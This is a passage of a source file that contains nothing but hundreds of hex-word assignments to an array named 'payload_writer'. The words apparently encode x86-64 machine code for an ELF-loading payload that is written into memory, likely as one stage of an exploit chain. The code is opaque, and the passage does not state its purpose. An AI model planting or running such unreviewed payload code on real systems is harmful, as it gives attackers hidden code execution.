  payload_writer[3515] = 0xe800001c;
  payload_writer[3516] = 0x000003bb;
  payload_writer[3517] = 0x24863d8b;
  payload_writer[3518] = 0x8d480000;
  payload_writer[3519] = 0x0024df15;
  payload_writer[3520] = 0x358d4800;
  payload_writer[3521] = 0x00001c75;
  payload_writer[3522] = 0x0003a2e8;
  payload_writer[3523] = 0x6d3d8b00;
  payload_writer[3524] = 0x48000024;
  payload_writer[3525] = 0x2506158d;
  payload_writer[3526] = 0x8d480000;
  payload_writer[3527] = 0x001c6b35;
  payload_writer[3528] = 0x0389e800;
  payload_writer[3529] = 0x3d8b0000;
  payload_writer[3530] = 0x00002454;
  payload_writer[3531] = 0x15158d48;
  payload_writer[3532] = 0x48000025;
  payload_writer[3533] = 0x1c6b358d;
  payload_writer[3534] = 0x70e80000;
  payload_writer[3535] = 0x8b000003;
  payload_writer[3536] = 0x00243b3d;
  payload_writer[3537] = 0x158d4800;
  payload_writer[3538] = 0x00002484;
  payload_writer[3539] = 0x70358d48;
  payload_writer[3540] = 0xe800001c;
  payload_writer[3541] = 0x00000357;
  payload_writer[3542] = 0x24223d8b;
  payload_writer[3543] = 0x8d480000;
  payload_writer[3544] = 0x00242b15;
  payload_writer[3545] = 0x358d4800;
  payload_writer[3546] = 0x00001c70;
  payload_writer[3547] = 0x00033ee8;
  payload_writer[3548] = 0x093d8b00;
  payload_writer[3549] = 0x48000024;
  payload_writer[3550] = 0x249a158d;
  payload_writer[3551] = 0x8d480000;
  payload_writer[3552] = 0x001c7435;
  payload_writer[3553] = 0x0325e800;
  payload_writer[3554] = 0x3d8b0000;
  payload_writer[3555] = 0x000023f0;
  payload_writer[3556] = 0xd9158d48;
  payload_writer[3557] = 0x48000024;
  payload_writer[3558] = 0x1c69358d;
  payload_writer[3559] = 0x0ce80000;
  payload_writer[3560] = 0x8b000003;
  payload_writer[3561] = 0x0023d73d;
  payload_writer[3562] = 0x158d4800;
  payload_writer[3563] = 0x00002440;
  payload_writer[3564] = 0x5e358d48;
  payload_writer[3565] = 0xe800001c;
  payload_writer[3566] = 0x000002f3;
  payload_writer[3567] = 0x23be3d8b;
  payload_writer[3568] = 0x8d480000;
  payload_writer[3569] = 0x00244715;
  payload_writer[3570] = 0x358d4800;
  payload_writer[3571] = 0x00001c53;
  payload_writer[3572] = 0x0002dae8;
  payload_writer[3573] = 0xa53d8b00;
  payload_writer[3574] = 0x48000023;
  payload_writer[3575] = 0x2446158d;
  payload_writer[3576] = 0x8d480000;
  payload_writer[3577] = 0x001c4935;
  payload_writer[3578] = 0x02c1e800;
  payload_writer[3579] = 0x3d8b0000;
  payload_writer[3580] = 0x0000238c;
  payload_writer[3581] = 0xad158d48;
  payload_writer[3582] = 0x48000023;
  payload_writer[3583] = 0x1c3f358d;
  payload_writer[3584] = 0xa8e80000;
  payload_writer[3585] = 0x8b000002;
  payload_writer[3586] = 0x0023733d;
  payload_writer[3587] = 0x158d4800;
  payload_writer[3588] = 0x0000243c;
  payload_writer[3589] = 0x35358d48;
  payload_writer[3590] = 0xe800001c;
  payload_writer[3591] = 0x0000028f;
  payload_writer[3592] = 0x235a3d8b;
  payload_writer[3593] = 0x8d480000;
  payload_writer[3594] = 0x00234315;
  payload_writer[3595] = 0x358d4800;
  payload_writer[3596] = 0x00001c2c;
  payload_writer[3597] = 0x000276e8;
  payload_writer[3598] = 0x413d8b00;
  payload_writer[3599] = 0x48000023;
  payload_writer[3600] = 0x23f2158d;
  payload_writer[3601] = 0x8d480000;
  payload_writer[3602] = 0x001c2935;
  payload_writer[3603] = 0x025de800;
  payload_writer[3604] = 0x3d8b0000;
  payload_writer[3605] = 0x00002328;
  payload_writer[3606] = 0x51158d48;
  payload_writer[3607] = 0x48000023;
  payload_writer[3608] = 0x1c28358d;
  payload_writer[3609] = 0x44e80000;
  payload_writer[3610] = 0x8b000002;
  payload_writer[3611] = 0x00230f3d;
  payload_writer[3612] = 0x158d4800;
  payload_writer[3613] = 0x00002370;
  payload_writer[3614] = 0x26358d48;
  payload_writer[3615] = 0xe800001c;
  payload_writer[3616] = 0x0000022b;
  payload_writer[3617] = 0x22f63d8b;
  payload_writer[3618] = 0x8d480000;
  payload_writer[3619] = 0x0023f715;
  payload_writer[3620] = 0x358d4800;
  payload_writer[3621] = 0x00001c14;
  payload_writer[3622] = 0x000212e8;
  payload_writer[3623] = 0xdd3d8b00;
  payload_writer[3624] = 0x48000022;
  payload_writer[3625] = 0x232e158d;
  payload_writer[3626] = 0x8d480000;
  payload_writer[3627] = 0x001c0835;
  payload_writer[3628] = 0x01f9e800;
  payload_writer[3629] = 0x3d8b0000;
  payload_writer[3630] = 0x000022c4;
  payload_writer[3631] = 0xd5158d48;
  payload_writer[3632] = 0x48000022;
  payload_writer[3633] = 0x1bf7358d;
  payload_writer[3634] = 0xe0e80000;
  payload_writer[3635] = 0x8b000001;
  payload_writer[3636] = 0x0022ab3d;
  payload_writer[3637] = 0x158d4800;
  payload_writer[3638] = 0x00002384;
  payload_writer[3639] = 0xe5358d48;
  payload_writer[3640] = 0xe800001b;
  payload_writer[3641] = 0x000001c7;
  payload_writer[3642] = 0x22923d8b;
  payload_writer[3643] = 0x8d480000;
  payload_writer[3644] = 0x00233b15;
  payload_writer[3645] = 0x358d4800;
  payload_writer[3646] = 0x00001bd9;
  payload_writer[3647] = 0x0001aee8;
  payload_writer[3648] = 0x793d8b00;
  payload_writer[3649] = 0x48000022;
  payload_writer[3650] = 0x235a158d;
  payload_writer[3651] = 0x8d480000;
  payload_writer[3652] = 0x001bd735;
  payload_writer[3653] = 0x0195e800;
  payload_writer[3654] = 0x3d8b0000;
  payload_writer[3655] = 0x00002260;
  payload_writer[3656] = 0x91158d48;
  payload_writer[3657] = 0x48000022;
  payload_writer[3658] = 0x1bd4358d;
  payload_writer[3659] = 0x7ce80000;
  payload_writer[3660] = 0x8b000001;
  payload_writer[3661] = 0x0022473d;
  payload_writer[3662] = 0x158d4800;
  payload_writer[3663] = 0x00002318;
  payload_writer[3664] = 0xd1358d48;
  payload_writer[3665] = 0xe800001b;
  payload_writer[3666] = 0x00000163;
  payload_writer[3667] = 0x222e3d8b;
  payload_writer[3668] = 0x8d480000;
  payload_writer[3669] = 0x00232715;
  payload_writer[3670] = 0x358d4800;
  payload_writer[3671] = 0x00001bce;
  payload_writer[3672] = 0x00014ae8;
  payload_writer[3673] = 0x153d8b00;
  payload_writer[3674] = 0x48000022;
  payload_writer[3675] = 0x224e158d;
  payload_writer[3676] = 0x8d480000;
  payload_writer[3677] = 0x001bcb35;
  payload_writer[3678] = 0x0131e800;
  payload_writer[3679] = 0x3d8b0000;
  payload_writer[3680] = 0x000021fc;
  payload_writer[3681] = 0xed158d48;
  payload_writer[3682] = 0x48000021;
  payload_writer[3683] = 0x1bb9358d;
  payload_writer[3684] = 0x18e80000;
  payload_writer[3685] = 0x8b000001;
  payload_writer[3686] = 0x0021e33d;
  payload_writer[3687] = 0x158d4800;
  payload_writer[3688] = 0x000021fc;
  payload_writer[3689] = 0xa7358d48;
  payload_writer[3690] = 0xe800001b;
  payload_writer[3691] = 0x000000ff;
  payload_writer[3692] = 0x21ca3d8b;
  payload_writer[3693] = 0x8d480000;
  payload_writer[3694] = 0x0022bb15;
  payload_writer[3695] = 0x358d4800;
  payload_writer[3696] = 0x00001b95;
  payload_writer[3697] = 0x0000e6e8;
  payload_writer[3698] = 0xb13d8b00;
  payload_writer[3699] = 0x48000021;
  payload_writer[3700] = 0x2232158d;
  payload_writer[3701] = 0x8d480000;
  payload_writer[3702] = 0x001b8335;
  payload_writer[3703] = 0x00cde800;
  payload_writer[3704] = 0x3d8b0000;
  payload_writer[3705] = 0x00002198;
  payload_writer[3706] = 0x51158d48;
  payload_writer[3707] = 0x48000022;
  payload_writer[3708] = 0x1b71358d;
  payload_writer[3709] = 0xb4e80000;
  payload_writer[3710] = 0x8b000000;
  payload_writer[3711] = 0x00217f3d;
  payload_writer[3712] = 0x158d4800;
  payload_writer[3713] = 0x000021f0;
  payload_writer[3714] = 0x358d4858;
  payload_writer[3715] = 0x00001b60;
  payload_writer[3716] = 0x00009ae9;
  payload_writer[3717] = 0x45535500;
  payload_writer[3718] = 0x4550c931;
  payload_writer[3719] = 0xc931c031;
  payload_writer[3720] = 0xf631d231;
  payload_writer[3721] = 0x4e3d8d48;
  payload_writer[3722] = 0xff00001b;
  payload_writer[3723] = 0x0021ef15;
  payload_writer[3724] = 0x45c93100;
  payload_writer[3725] = 0xc589c931;
  payload_writer[3726] = 0x31c03145;
  payload_writer[3727] = 0x48f631d2;
  payload_writer[3728] = 0x1b593d8d;
  payload_writer[3729] = 0x15ff0000;
  payload_writer[3730] = 0x000021d4;
  payload_writer[3731] = 0x8d48ef89;
  payload_writer[3732] = 0x00224315;
  payload_writer[3733] = 0x48c38900;
  payload_writer[3734] = 0x1b6d358d;
  payload_writer[3735] = 0x4ce80000;
  payload_writer[3736] = 0x59000000;
  payload_writer[3737] = 0x485bdf89;
  payload_writer[3738] = 0x223a158d;
  payload_writer[3739] = 0x485d0000;
  payload_writer[3740] = 0x1b7e358d;
  payload_writer[3741] = 0x34e90000;
  payload_writer[3742] = 0x53000000;
  payload_writer[3743] = 0x48fa8948;
  payload_writer[3744] = 0x0200ec81;
  payload_writer[3745] = 0x8d480000;
  payload_writer[3746] = 0x00122635;
  payload_writer[3747] = 0xe7894800;
  payload_writer[3748] = 0x15ffc031;
  payload_writer[3749] = 0x000024d0;
  payload_writer[3750] = 0xbfe68948;
  payload_writer[3751] = 0x000000de;
  payload_writer[3752] = 0x21f215ff;
  payload_writer[3753] = 0x81480000;
  payload_writer[3754] = 0x000200c4;
  payload_writer[3755] = 0x48c35b00;
  payload_writer[3756] = 0x024fc0c7;
  payload_writer[3757] = 0x49e90000;
  payload_writer[3758] = 0x48000010;
  payload_writer[3759] = 0x0250c0c7;
  payload_writer[3760] = 0x3de90000;
  payload_writer[3761] = 0x48000010;
  payload_writer[3762] = 0x3150f189;
  payload_writer[3763] = 0xfe8948d2;
  payload_writer[3764] = 0xbfc03145;
  payload_writer[3765] = 0x00000252;
  payload_writer[3766] = 0x22e8c031;
  payload_writer[3767] = 0x5a000010;
  payload_writer[3768] = 0xc0c748c3;
  payload_writer[3769] = 0x00000003;
  payload_writer[3770] = 0x001017e9;
  payload_writer[3771] = 0xc0c74800;
  payload_writer[3772] = 0x00000004;
  payload_writer[3773] = 0x00100be9;
  payload_writer[3774] = 0xc0c74800;
  payload_writer[3775] = 0x00000005;
  payload_writer[3776] = 0x000fffe9;
  payload_writer[3777] = 0xc0c74800;
  payload_writer[3778] = 0x00000006;
  payload_writer[3779] = 0x000ff3e9;
  payload_writer[3780] = 0xc0c74800;
  payload_writer[3781] = 0x0000000a;
  payload_writer[3782] = 0x000fe7e9;
  payload_writer[3783] = 0xc0c74800;
  payload_writer[3784] = 0x00000009;
  payload_writer[3785] = 0x000fdbe9;
  payload_writer[3786] = 0xc0c74800;
  payload_writer[3787] = 0x0000003a;
  payload_writer[3788] = 0x000fcfe9;
  payload_writer[3789] = 0xc0c74800;
  payload_writer[3790] = 0x00000039;
  payload_writer[3791] = 0x000fc3e9;
  payload_writer[3792] = 0xc0c74800;
  payload_writer[3793] = 0x00000015;
  payload_writer[3794] = 0x000fb7e9;
  payload_writer[3795] = 0xc0c74800;
  payload_writer[3796] = 0x0000017a;
  payload_writer[3797] = 0x000fabe9;
  payload_writer[3798] = 0xc0c74800;
  payload_writer[3799] = 0x00000016;
  payload_writer[3800] = 0x000f9fe9;
  payload_writer[3801] = 0xc0c74800;
  payload_writer[3802] = 0x0000007b;
  payload_writer[3803] = 0x000f93e9;
  payload_writer[3804] = 0xc0c74800;
  payload_writer[3805] = 0x0000007c;
  payload_writer[3806] = 0x000f87e9;
  payload_writer[3807] = 0xc0c74800;
  payload_writer[3808] = 0x00000080;
  payload_writer[3809] = 0x000f7be9;
  payload_writer[3810] = 0xc0c74800;
  payload_writer[3811] = 0x00000088;
  payload_writer[3812] = 0x000f6fe9;
  payload_writer[3813] = 0xc0c74800;
  payload_writer[3814] = 0x00000089;
  payload_writer[3815] = 0x000f63e9;
  payload_writer[3816] = 0xc0c74800;
  payload_writer[3817] = 0x000000bc;
  payload_writer[3818] = 0x000f57e9;
  payload_writer[3819] = 0xc0c74800;
  payload_writer[3820] = 0x000000bd;
  payload_writer[3821] = 0x000f4be9;
  payload_writer[3822] = 0xc0c74800;
  payload_writer[3823] = 0x000000be;
  payload_writer[3824] = 0x000f3fe9;
  payload_writer[3825] = 0xc0c74800;
  payload_writer[3826] = 0x00000110;
  payload_writer[3827] = 0x000f33e9;
  payload_writer[3828] = 0xc0c74800;
  payload_writer[3829] = 0x000001de;
  payload_writer[3830] = 0x000f27e9;
  payload_writer[3831] = 0xc0c74800;
  payload_writer[3832] = 0x000001ed;
  payload_writer[3833] = 0x000f1be9;
  payload_writer[3834] = 0x41574100;
  payload_writer[3835] = 0x41554156;
  payload_writer[3836] = 0x48535554;
  payload_writer[3837] = 0x8b28ec83;
  payload_writer[3838] = 0x5489482e;
  payload_writer[3839] = 0x894c0824;
  payload_writer[3840] = 0x85102444;
  payload_writer[3841] = 0xa8880fed;
  payload_writer[3842] = 0x83000000;
  payload_writer[3843] = 0x894902c5;
  payload_writer[3844] = 0xdd6348fc;
  payload_writer[3845] = 0x483f8b48;
  payload_writer[3846] = 0x4904e3c1;
  payload_writer[3847] = 0x8949f689;
  payload_writer[3848] = 0xde8948cf;
  payload_writer[3849] = 0x229615ff;
  payload_writer[3850] = 0x8b4c0000;
  payload_writer[3851] = 0x48102444;
  payload_writer[3852] = 0x8949c085;
  payload_writer[3853] = 0x09752404;
  payload_writer[3854] = 0xff06c741;
  payload_writer[3855] = 0xebffffff;
  payload_writer[3856] = 0x6b8d4c72;
  payload_writer[3857] = 0x7c8b48e0;
  payload_writer[3858] = 0x014c0824;
  payload_writer[3859] = 0x44894ce8;
  payload_writer[3860] = 0x89481824;
  payload_writer[3861] = 0xff102444;
  payload_writer[3862] = 0x00229b15;
  payload_writer[3863] = 0x548b4800;
  payload_writer[3864] = 0x8b481024;
  payload_writer[3865] = 0x4808247c;
  payload_writer[3866] = 0x034d0289;
  payload_writer[3867] = 0x15ff242c;
  payload_writer[3868] = 0x0000232c;
  payload_writer[3869] = 0x24448b4c;
  payload_writer[3870] = 0xc0ff4818;
  payload_writer[3871] = 0x08458949;
  payload_writer[3872] = 0x24048b49;
  payload_writer[3873] = 0xfff88349;
  payload_writer[3874] = 0x187c894c;
  payload_writer[3875] = 0x451575f0;
  payload_writer[3876] = 0x854dc031;
  payload_writer[3877] = 0x4c0d74ff;
  payload_writer[3878] = 0x15ffff89;
  payload_writer[3879] = 0x00002300;
  payload_writer[3880] = 0x01408d4c;
  payload_writer[3881] = 0x24048b49;
  payload_writer[3882] = 0x4cc0634d;
  payload_writer[3883] = 0xf8184489;
  payload_writer[3884] = 0x482e8941;
  payload_writer[3885] = 0x5b28c483;
  payload_writer[3886] = 0x415c415d;
  payload_writer[3887] = 0x415e415d;
  payload_writer[3888] = 0x5741c35f;
  payload_writer[3889] = 0x55415641;
  payload_writer[3890] = 0x53555441;
  payload_writer[3891] = 0x18ec8348;
  payload_writer[3892] = 0x48fe8949;
  payload_writer[3893] = 0x04246c8d;
  payload_writer[3894] = 0x245c8d48;
  payload_writer[3895] = 0xf7894908;
  payload_writer[3896] = 0x48cc8949;
  payload_writer[3897] = 0x8948ee89;
  payload_writer[3898] = 0xdf8948d1;
  payload_writer[3899] = 0x18158d48;
  payload_writer[3900] = 0x4500001a;
  payload_writer[3901] = 0x8349c589;
  payload_writer[3902] = 0xc748ffc8;
  payload_writer[3903] = 0x00082444;
  payload_writer[3904] = 0xc7000000;
  payload_writer[3905] = 0x00042444;
  payload_writer[3906] = 0xe8000000;
  payload_writer[3907] = 0xfffffed9;
  payload_writer[3908] = 0xffc88349;
  payload_writer[3909] = 0x48f9894c;
  payload_writer[3910] = 0x19f4158d;
  payload_writer[3911] = 0x89480000;
  payload_writer[3912] = 0xdf8948ee;
  payload_writer[3913] = 0xfffec0e8;
  payload_writer[3914] = 0xc88349ff;
  payload_writer[3915] = 0xf1894cff;
  payload_writer[3916] = 0xe2158d48;
  payload_writer[3917] = 0x48000019;
  payload_writer[3918] = 0x8948ee89;
  payload_writer[3919] = 0xfea7e8df;
  payload_writer[3920] = 0x8349ffff;
  payload_writer[3921] = 0x8d48ffc8;
  payload_writer[3922] = 0x0019d10d;
  payload_writer[3923] = 0x158d4800;
  payload_writer[3924] = 0x000019ce;
  payload_writer[3925] = 0x48ee8948;
  payload_writer[3926] = 0x8ae8df89;
  payload_writer[3927] = 0x49fffffe;
  payload_writer[3928] = 0x48ffc883;
  payload_writer[3929] = 0x19be0d8d;
  payload_writer[3930] = 0x8d480000;
  payload_writer[3931] = 0x0019be15;
  payload_writer[3932] = 0xee894800;
  payload_writer[3933] = 0xe8df8948;
  payload_writer[3934] = 0xfffffe6d;
  payload_writer[3935] = 0xffc88349;
  payload_writer[3936] = 0x270d8d48;
  payload_writer[3937] = 0x48000014;
  payload_writer[3938] = 0x19aa158d;
  payload_writer[3939] = 0x89480000;
  payload_writer[3940] = 0xdf8948ee;
  payload_writer[3941] = 0xfffe50e8;
  payload_writer[3942] = 0xc88349ff;
  payload_writer[3943] = 0x0d8d48ff;
  payload_writer[3944] = 0x0000140a;
  payload_writer[3945] = 0x93158d48;
  payload_writer[3946] = 0x48000019;
  payload_writer[3947] = 0x8948ee89;
  payload_writer[3948] = 0xfe33e8df;
  payload_writer[3949] = 0x854dffff;
  payload_writer[3950] = 0x493274e4;
  payload_writer[3951] = 0x4cffc883;
  payload_writer[3952] = 0x8d48e189;
  payload_writer[3953] = 0x00197f15;
  payload_writer[3954] = 0xee894800;
  payload_writer[3955] = 0xe8df8948;
  payload_writer[3956] = 0xfffffe15;
  payload_writer[3957] = 0xffc88349;
  payload_writer[3958] = 0x48e1894c;
  payload_writer[3959] = 0x1969158d;
  payload_writer[3960] = 0x89480000;
  payload_writer[3961] = 0xdf8948ee;
  payload_writer[3962] = 0xfffdfce8;
  payload_writer[3963] = 0x24748bff;
  payload_writer[3964] = 0xea894404;
  payload_writer[3965] = 0x247c8b48;
  payload_writer[3966] = 0xfd4fe808;
  payload_writer[3967] = 0x8348ffff;
  payload_writer[3968] = 0x5d5b18c4;
  payload_writer[3969] = 0x5d415c41;
  payload_writer[3970] = 0x5f415e41;
  payload_writer[3971] = 0x555441c3;
  payload_writer[3972] = 0x48d23153;
  payload_writer[3973] = 0x3180c483;
  payload_writer[3974] = 0xfc8949f6;
  payload_writer[3975] = 0xd6e8ed31;
  payload_writer[3976] = 0x83fffffc;
  payload_writer[3977] = 0x840ffff8;
  payload_writer[3978] = 0x00000080;
  payload_writer[3979] = 0x8d48c389;
  payload_writer[3980] = 0x4c082474;
  payload_writer[3981] = 0x66e8e789;
  payload_writer[3982] = 0x45fffffd;
  payload_writer[3983] = 0xff31c931;
  payload_writer[3984] = 0xb9d88941;
  payload_writer[3985] = 0x00000002;
  payload_writer[3986] = 0x000003ba;
  payload_writer[3987] = 0x4000be00;
  payload_writer[3988] = 0xf4e80000;
  payload_writer[3989] = 0x48000003;
  payload_writer[3990] = 0x74fff883;
  payload_writer[3991] = 0x748b4848;
  payload_writer[3992] = 0x83485024;
  payload_writer[3993] = 0x307e03fe;
  payload_writer[3994] = 0x154f3881;
  payload_writer[3995] = 0x28751d3d;
  payload_writer[3996] = 0x1850b70f;
  payload_writer[3997] = 0xe2c1c2ff;
  payload_writer[3998] = 0x044a8d05;
  payload_writer[3999] = 0x48c96348;
  payload_writer[4000] = 0x147cce39;
  payload_writer[4001] = 0x3120ea83;
  payload_writer[4002] = 0xd26348ed;
  payload_writer[4003] = 0x20107c81;
  payload_writer[4004] = 0x464c457f;
  payload_writer[4005] = 0xc5940f40;
  payload_writer[4006] = 0x004000be;
  payload_writer[4007] = 0xc7894800;
  payload_writer[4008] = 0x0003b2e8;
  payload_writer[4009] = 0xe8df8900;
  payload_writer[4010] = 0xfffffc59;
  payload_writer[4011] = 0x80ec8348;
  payload_writer[4012] = 0x5d5be889;
  payload_writer[4013] = 0x41c35c41;
  payload_writer[4014] = 0x41564157;
  payload_writer[4015] = 0x55544155;
  payload_writer[4016] = 0xec834853;
  payload_writer[4017] = 0xe6c14818;
  payload_writer[4018] = 0x247c8920;
  payload_writer[4019] = 0xd609480c;
  payload_writer[4020] = 0x4dcd8948;
  payload_writer[4021] = 0x8949c589;
  payload_writer[4022] = 0x00bf41f4;
  payload_writer[4023] = 0x48001000;
  payload_writer[4024] = 0x5874ed85;
  payload_writer[4025] = 0x24448b44;
  payload_writer[4026] = 0xfd81480c;
  payload_writer[4027] = 0x00100000;
  payload_writer[4028] = 0x48fb894c;
  payload_writer[4029] = 0x4ddd460f;
  payload_writer[4030] = 0xff31e189;
  payload_writer[4031] = 0x080002b9;
  payload_writer[4032] = 0x0001ba00;
  payload_writer[4033] = 0x89480000;
  payload_writer[4034] = 0x033de8de;
  payload_writer[4035] = 0x83480000;
  payload_writer[4036] = 0x8949fff8;
  payload_writer[4037] = 0x4c2c74c6;
  payload_writer[4038] = 0x8948ef89;
  payload_writer[4039] = 0xc68948da;
  payload_writer[4040] = 0xffdd0149;
  payload_writer[4041] = 0x001ee715;
  payload_writer[4042] = 0xde894800;
  payload_writer[4043] = 0xe8f7894c;
  payload_writer[4044] = 0x00000323;
  payload_writer[4045] = 0x49dd2948;
  payload_writer[4046] = 0xa3ebdc01;
  payload_writer[4047] = 0x000001b8;
  payload_writer[4048] = 0x3102eb00;
  payload_writer[4049] = 0xc48348c0;
  payload_writer[4050] = 0x415d5b18;
  payload_writer[4051] = 0x415d415c;
  payload_writer[4052] = 0xc35f415e;
  payload_writer[4053] = 0x20c28348;
  payload_writer[4054] = 0xc839c031;
  payload_writer[4055] = 0xf0392d7d;
  payload_writer[4056] = 0x8b4c2174;
  payload_writer[4057] = 0xd2854d12;
  payload_writer[4058] = 0x8b4c1974;
  payload_writer[4059] = 0x8b4c084f;
  payload_writer[4060] = 0x394de842;
  payload_writer[4061] = 0x4c0c72c1;
  payload_writer[4062] = 0x4d204f03;
  payload_writer[4063] = 0x394dd001;
  payload_writer[4064] = 0xff0b76c1;
  payload_writer[4065] = 0xc28348c0;
  payload_writer[4066] = 0x31cfeb38;
  payload_writer[4067] = 0x01b8c3c0;
  payload_writer[4068] = 0xc3000000;
  payload_writer[4069] = 0x56415741;
  payload_writer[4070] = 0x54415541;
  payload_writer[4071] = 0xfd894855;
  payload_writer[4072] = 0x53fe6348;
  payload_writer[4073] = 0x48fb8948;
  payload_writer[4074] = 0x4828ff6b;
  payload_writer[4075] = 0x4918ec83;
  payload_writer[4076] = 0x15ffd489;
  payload_writer[4077] = 0x00001e70;
  payload_writer[4078] = 0x49ed3145;
  payload_writer[4079] = 0x8949eb89;
  payload_writer[4080] = 0xf63145c0;
  payload_writer[4081] = 0x7ddd3941;
  payload_writer[4082] = 0x7b8b4d77;
  payload_writer[4083] = 0xff854d20;
  payload_writer[4084] = 0xd9896574;
  payload_writer[4085] = 0x44ea8948;
  payload_writer[4086] = 0x894cee89;
  payload_writer[4087] = 0x44894cdf;
  payload_writer[4088] = 0x6de80824;
  payload_writer[4089] = 0x4cffffff;
  payload_writer[4090] = 0x0824448b;
  payload_writer[4091] = 0x0974c085;
  payload_writer[4092] = 0x013b8141;
  payload_writer[4093] = 0x756fffff;
  payload_writer[4094] = 0xc663493e;
  payload_writer[4095] = 0x30538b49;
  payload_writer[4096] = 0x28c06b48;
  payload_writer[4097] = 0x49c6ff41;
  payload_writer[4098] = 0xff174c8d;
  payload_writer[4099] = 0x48daf748;
  payload_writer[4100] = 0x014cca21;
  payload_writer[4101] = 0x508948c0;
  payload_writer[4102] = 0x78894c10;
  payload_writer[4103] = 0x538b4918;
  payload_writer[4104] = 0x28894408;
  payload_writer[4105] = 0x08508948;
  payload_writer[4106] = 0x8141d231;
  payload_writer[4107] = 0xffff013b;
  payload_writer[4108] = 0xc2950f6f;
  payload_writer[4109] = 0x41205089;
  payload_writer[4110] = 0x8349c5ff;
  payload_writer[4111] = 0x84eb38c3;
  payload_writer[4112] = 0x24348945;
  payload_writer[4113] = 0x18c48348;
  payload_writer[4114] = 0xc0894c5b;
  payload_writer[4115] = 0x415c415d;
  payload_writer[4116] = 0x415e415d;
  payload_writer[4117] = 0x5741c35f;
  payload_writer[4118] = 0x55415641;
  payload_writer[4119] = 0x53555441;
  payload_writer[4120] = 0x18ec8348;
  payload_writer[4121] = 0x48f58941;
  payload_writer[4122] = 0x01bed389;
  payload_writer[4123] = 0xba000006;
  payload_writer[4124] = 0x000001ff;
  payload_writer[4125] = 0x4cce8941;
  payload_writer[4126] = 0x08244489;
  payload_writer[4127] = 0xfffa78e8;
  payload_writer[4128] = 0xfff883ff;
  payload_writer[4129] = 0x00e0840f;
  payload_writer[4130] = 0x8b4c0000;
  payload_writer[4131] = 0x89082444;
  payload_writer[4132] = 0x48c589c7;
  payload_writer[4133] = 0x4518c383;
  payload_writer[4134] = 0x0f41ff31;
  payload_writer[4135] = 0x4c3850b7;
  payload_writer[4136] = 0x6b48c689;
  payload_writer[4137] = 0x834838d2;
  payload_writer[4138] = 0x3ee840c2;
  payload_writer[4139] = 0x45fffffa;
  payload_writer[4140] = 0x8d0ff739;
  payload_writer[4141] = 0x0000009d;
  payload_writer[4142] = 0xf87b8b48;
  payload_writer[4143] = 0x1d6615ff;
  payload_writer[4144] = 0x8b480000;
  payload_writer[4145] = 0xf631f853;
  payload_writer[4146] = 0x48c48949;
  payload_writer[4147] = 0x15ffc789;
  payload_writer[4148] = 0x00001e4c;
  payload_writer[4149] = 0x00087b83;
  payload_writer[4150] = 0x63482b74;
  payload_writer[4151] = 0xd231e873;
  payload_writer[4152] = 0x4d0b8b48;
  payload_writer[4153] = 0x8944e089;
  payload_writer[4154] = 0xfdc9e8ef;
  payload_writer[4155] = 0xc085ffff;
  payload_writer[4156] = 0x8b484e74;
  payload_writer[4157] = 0xd231f073;
  payload_writer[4158] = 0xd2e8ef89;
  payload_writer[4159] = 0x48fffffa;
  payload_writer[4160] = 0xebf8538b;
  payload_writer[4161] = 0x338b4831;
  payload_writer[4162] = 0x000002ba;
  payload_writer[4163] = 0xef894400;
  payload_writer[4164] = 0xe8def748;
  payload_writer[4165] = 0xfffffab9;
  payload_writer[4166] = 0x4c138b48;
  payload_writer[4167] = 0x8944e689;
  payload_writer[4168] = 0xf9bbe8ef;
  payload_writer[4169] = 0x8b48ffff;
  payload_writer[4170] = 0xd231f073;
  payload_writer[4171] = 0x9ee8ef89;
  payload_writer[4172] = 0x48fffffa;
  payload_writer[4173] = 0x894c138b;
  payload_writer[4174] = 0xe8ef89e6;
  payload_writer[4175] = 0xfffff9ad;
  payload_writer[4176] = 0x41e7894c;
  payload_writer[4177] = 0x15ffc7ff;
  payload_writer[4178] = 0x00001e74;
  payload_writer[4179] = 0x28c38348;
  payload_writer[4180] = 0xffff5ae9;
  payload_writer[4181] = 0xc48348ff;
  payload_writer[4182] = 0x5bef8918;
  payload_writer[4183] = 0x415c415d;
  payload_writer[4184] = 0x415e415d;
  payload_writer[4185] = 0xf99be95f;
  payload_writer[4186] = 0x8348ffff;
  payload_writer[4187] = 0x5d5b18c4;
  payload_writer[4188] = 0x5d415c41;
  payload_writer[4189] = 0x5f415e41;
  payload_writer[4190] = 0x415541c3;
  payload_writer[4191] = 0x48535554;
  payload_writer[4192] = 0x3128ec83;
  payload_writer[4193] = 0xf58948d2;
  payload_writer[4194] = 0x6ae8f631;
  payload_writer[4195] = 0x83fffff9;
  payload_writer[4196] = 0x840ffff8;
  payload_writer[4197] = 0x000000a8;
  payload_writer[4198] = 0x31c93145;
  payload_writer[4199] = 0xc08941ff;
  payload_writer[4200] = 0x000002b9;
  payload_writer[4201] = 0x0003ba00;
  payload_writer[4202] = 0x00be0000;
  payload_writer[4203] = 0x89000040;
  payload_writer[4204] = 0x0095e8c3;
  payload_writer[4205] = 0x83480000;
  payload_writer[4206] = 0x8949fff8;
  payload_writer[4207] = 0x0f7a74c4;
  payload_writer[4208] = 0x481840b7;
  payload_writer[4209] = 0x1c24548d;
  payload_writer[4210] = 0x1c2444c7;
  payload_writer[4211] = 0x00000000;
  payload_writer[4212] = 0x4805e0c1;
  payload_writer[4213] = 0x448d4d98;
  payload_writer[4214] = 0x0f412004;
  payload_writer[4215] = 0x663870b7;
  payload_writer[4216] = 0x3e40c741;
  payload_writer[4217] = 0x41660000;
  payload_writer[4218] = 0x003c40c7;
  payload_writer[4219] = 0xc7416600;
  payload_writer[4220] = 0x00003a40;
  payload_writer[4221] = 0x40788d49;
  payload_writer[4222] = 0x2840c749;
  payload_writer[4223] = 0x00000000;
  payload_writer[4224] = 0x2444894c;
  payload_writer[4225] = 0xfd8ae808;
  payload_writer[4226] = 0x8b4cffff;
  payload_writer[4227] = 0x89082444;
  payload_writer[4228] = 0x244c8bde;
  payload_writer[4229] = 0xc589491c;
  payload_writer[4230] = 0x48c28948;
  payload_writer[4231] = 0x33e8ef89;
  payload_writer[4232] = 0x4cfffffe;
  payload_writer[4233] = 0x15ffef89;
  payload_writer[4234] = 0x00001d94;
  payload_writer[4235] = 0x004000be;
  payload_writer[4236] = 0xe7894c00;
  payload_writer[4237] = 0x00001ee8;
  payload_writer[4238] = 0xe8df8900;
  payload_writer[4239] = 0xfffff8c5;
  payload_writer[4240] = 0x28c48348;
  payload_writer[4241] = 0x5c415d5b;
  payload_writer[4242] = 0x48c35d41;
  payload_writer[4243] = 0x01ddc0c7;
  payload_writer[4244] = 0xade90000;
  payload_writer[4245] = 0x48000008;
